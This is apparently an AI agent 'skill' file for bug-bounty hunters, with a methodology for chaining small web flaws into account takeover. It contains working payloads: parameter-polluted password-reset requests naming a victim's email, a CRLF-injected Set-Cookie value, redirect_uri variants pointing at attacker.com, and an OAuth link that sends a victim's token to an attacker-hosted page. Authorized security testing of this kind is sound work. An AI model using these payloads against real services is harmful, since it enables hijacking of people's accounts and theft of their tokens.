---
name: ato-chains
description: Hunt full Account Takeover (ATO) by chaining lower-severity findings — IDOR-to-email-disclosure, password-reset-token-theft, OAuth-redirect-uri abuse, response-manipulation, cookie scope, CRLF in Set-Cookie, race-condition on signup. Use when the user wants to escalate small findings to ATO or thinks an ATO path exists.
metadata:
  type: skill
  phase: hunt
  vuln_class: ato
  severity: critical
  paid_examples: hackerone
---

# ATO Chains

> ATO = Critical = $$$$. Find the small bugs that chain into it.

## When to invoke

**Trigger phrases:**
- "account takeover"
- "ATO chain"
- "escalate this to ATO"
- "how to take over account"
- "password reset vuln"

## The 9 ATO paths

### Path 1: Password reset token leakage
- Token in URL → leaked via Referer to 3rd-party (analytics, fonts)
- Token in response → IDOR on reset endpoint reveals victim's token
- Token guessable → low entropy
- Token reusable → not invalidated after use
- Token doesn't expire → forever valid
- Reset link sent to user-controlled email field
  - `POST /reset {"email":"victim@x.com","cc":"attacker@x.com"}`

### Path 2: Email change without confirmation
- Change victim's email to attacker's via IDOR/CSRF
- No confirmation to old email = silent ATO
- Confirmation token reused / guessable

### Path 3: OAuth redirect_uri / state abuse
- `redirect_uri` accepts attacker domain → token sent there
- `redirect_uri` partial match → `target.com.attacker.com`
- `state` not validated → CSRF-style victim binds attacker's OAuth to victim's session

### Path 4: Response manipulation (client-side ATO)
- 2FA verify returns `{"verified": true, "user_id": X}` → swap `user_id`
- Some clients trust response body for auth state
- Burp → intercept → modify `200 OK` to redirect into authenticated state

### Path 5: Cookie hijacking
- Cookie issued without `Secure` → MITM
- Cookie without `HttpOnly` → XSS reads session
- Cookie scope too wide → `domain=.target.com` from `evil.target.com` (subdomain takeover lets you read root cookies)
- SameSite=None without `Secure` → CSRF-like

### Path 6: JWT-based ATO
- JWT alg=none accepted
- JWT key confusion (RS256 → HS256 with public key)
- JWT kid path traversal
- JWT `email` claim mutable → server trusts → ATO
See `[[jwt-attacks]]`.

### Path 7: Race condition
- Sign up with victim's email at the same instant they confirm → win race
- Password reset race: two reset requests at once → both tokens valid → attacker uses theirs

### Path 8: CRLF / header injection in Set-Cookie
- Sets session cookie with attacker's value
- `?next=foo%0d%0aSet-Cookie:%20session=evil`

### Path 9: WebSocket / SSE auth ignored
- WebSocket connects without auth → can act as any user
- SSE stream tied to user ID in URL (IDOR)

## Step-by-Step Workflow

### 1. Map auth-related endpoints

From your `[[threat-modeling-mindmap]]` output:
- `/login`, `/sso/*`, `/oauth/*`
- `/register`, `/signup`
- `/reset`, `/forgot-password`, `/reset-confirm`
- `/2fa/*`
- `/account/email`, `/profile/update-email`
- `/logout`
- `/api/auth/*`, `/api/me`, `/api/user/me`
- `/oauth/authorize`, `/oauth/token`
- `/callback`, `/oauth-callback`

### 2. Test each auth flow systematically

#### Password reset flow
1. Trigger reset for your own account: capture the email
2. Note the token format: length, charset, predictability?
3. Test reuse: use the token, then try again — should fail
4. Test expiry: wait 24h, try the token — should fail
5. Test parameter pollution: `POST /reset {"email":"you@x.com","email":"victim@x.com"}`
6. Test array: `POST /reset {"email":["you@x.com","victim@x.com"]}`
7. Test response: does the response leak the token or new password?
8. Check for IDOR: `GET /reset/token/by-user-id/12346`

```bash
# Quick scripted reset token analysis
for i in {1..10}; do
    curl -s -X POST https://target.com/reset \
        -H "Content-Type: application/json" \
        -d '{"email":"you+'$i'@example.com"}'
    # Capture each token from email
done
# Are tokens sequential? Predictable? Short?
```

#### Email change flow
1. Change your email to a new value
2. Capture the request
3. Add victim's user_id in body / path
4. Send → if it goes through, ATO via email change
5. No confirmation to old email = silent ATO

#### 2FA flow
1. Enable 2FA, then test:
   - Skip /2fa/verify, go to /dashboard directly
   - Replay /2fa/verify response (always 200) with bad code
   - Race-condition: 5 simultaneous requests with brute-forced codes
   - Brute force: is rate limit on attempts? (try 000000-999999)
   - Backup codes: are they predictable?

#### OAuth flow
See `[[oauth-oidc]]` for full coverage.
- Capture `/oauth/authorize?redirect_uri=...` request
- Try `redirect_uri=https://attacker.com`
- Try `redirect_uri=https://target.com.attacker.com`
- Try `redirect_uri=https://target.com@attacker.com`
- Try `redirect_uri=//attacker.com`
- Test `state` removal: does the callback still accept?

### 3. Look for chains across findings

When you find:
- **IDOR reading user email** → can you reset their password (email-only reset)?
- **Open redirect** → can you chain to OAuth callback for token theft?
- **XSS** → can you read auth cookies → session hijack?
- **SSRF** → can you reach internal admin endpoint to add yourself as admin?
- **Subdomain takeover** → cookies scoped to `.target.com` → session theft

Build a chain table:
```
A1. IDOR /api/user/{id}/email      → leaks victim email
A2. POST /reset {"email":<victim>} → sends reset link
A3. Reset link goes to victim, BUT
A4. We're now able to spam unlimited reset requests
A5. Combined with cleartext email logs in S3 (bug #2) → token leaked
A6. Attacker uses token → ATO

OR:

B1. Open redirect at /redirect?url=<attacker>
B2. OAuth callback at /oauth/callback uses ?redirect_uri=
B3. We craft /oauth/authorize?redirect_uri=https://target.com/redirect?url=https://attacker.com
B4. Victim logs in via Google
B5. Token redirects to attacker.com
B6. Attacker uses token → ATO
```

### 4. Common chain combinations

| Chain | Sev | Notes |
|---|---|---|
| IDOR (email) + email-only-reset | Critical | Most common ATO pattern |
| Open redirect + OAuth callback | Critical | `[[oauth-oidc]]` |
| XSS + cookie not HttpOnly + cookie scoped wide | Critical | Classic |
| Response manipulation (2FA bypass) | Critical | Less common but ☠️ |
| Subdomain takeover + cookie scope `.target.com` | High | Steal session via XSS on takeover sub |
| JWT alg=none + email claim used | Critical | `[[jwt-attacks]]` |
| CRLF in Set-Cookie + victim follows link | High | OK if Set-Cookie comes from input |
| Race condition on signup | High | Hijack pending account confirmation |

## Output template (for the report)

```markdown
## Critical: Account Takeover via OAuth redirect_uri + open redirect chain

### Summary
By chaining an open redirect on /redirect?url= with a permissive OAuth redirect_uri validator, an attacker can hijack any user's account on app.target.com after the victim clicks an attacker-supplied link.

### Steps to reproduce
1. Attacker hosts a malicious page at `https://attacker.com/grab.html` that logs the token from URL fragment.
2. Attacker sends victim:
   ```
   https://app.target.com/oauth/authorize?
     client_id=XYZ&
     response_type=token&
     redirect_uri=https://app.target.com/redirect?url=https://attacker.com/grab.html
   ```
3. Victim, logged in, sees a target.com URL → trusts → clicks
4. Target validates `redirect_uri` starts with `https://app.target.com` ✓
5. Issues OAuth token, redirects to `/redirect?url=...`
6. `/redirect?url=https://attacker.com/grab.html` returns 302
7. Browser follows → token reaches attacker.com via URL fragment
8. Attacker uses token: full session as victim

### Impact
- Full account takeover for any logged-in user who clicks the link
- No prerequisite credentials needed
- Token includes scope for full profile, billing, and project access

### Reproduction artifacts
- HAR file: attached
- Screencast: attached
- Test accounts: provided

### Suggested fix
1. Strictly whitelist `redirect_uri` to exact registered URIs (no subpath matching)
2. Remove or sanitize `/redirect?url=` to disallow off-domain redirects
```

## Cross-references

- `[[idor-hunting]]` — IDOR is the most common ATO precursor
- `[[xss]]` — XSS + cookie access = ATO if cookie not HttpOnly
- `[[oauth-oidc]]` — OAuth-specific chains
- `[[jwt-attacks]]` — JWT-based ATO
- `[[business-logic]]` — race conditions, workflow bypass
- `[[hackerone-reporting]]` — ATO report template (impact framing matters)

## Common pitfalls

1. **Reporting an "open redirect" without the chain.** Most programs auto-reject. Chain it to OAuth.
2. **No reproduction with a real victim account.** Sim with test accounts in different browsers/profiles.
3. **Missing the "user interaction" disclosure.** Most ATOs require victim to click — note this in impact.
4. **Reporting reset-token-leak in URL via Referer without proof.** Validate token actually leaks to a 3rd party.
5. **Confusing "session hijack" with "ATO".** Session is temporary; ATO = persistent control (password reset).

## ATO severity matrix

| Type | Severity | Typical bounty |
|---|---|---|
| Self-only "ATO" (no real impact) | N/A | $0 |
| Targeted ATO requiring complex social engineering | High | $1k-3k |
| Targeted ATO via 1-click link | Critical | $5k-15k |
| Mass ATO (no user interaction, no targeting) | Critical | $10k-50k |
| Persistent ATO via password reset abuse | Critical | $5k-25k |
| ATO of admin / privileged user | Critical (escalate severity) | $10k-50k |

## Pro tip — write the chain BEFORE proving it

When you find a finding, ask: **"what's the worst this gets to?"** Often you can chain on paper before testing.

E.g., "IDOR on /reset/token-lookup → if real, that's email-based ATO → critical."
Now you know the upside before spending time on PoC.
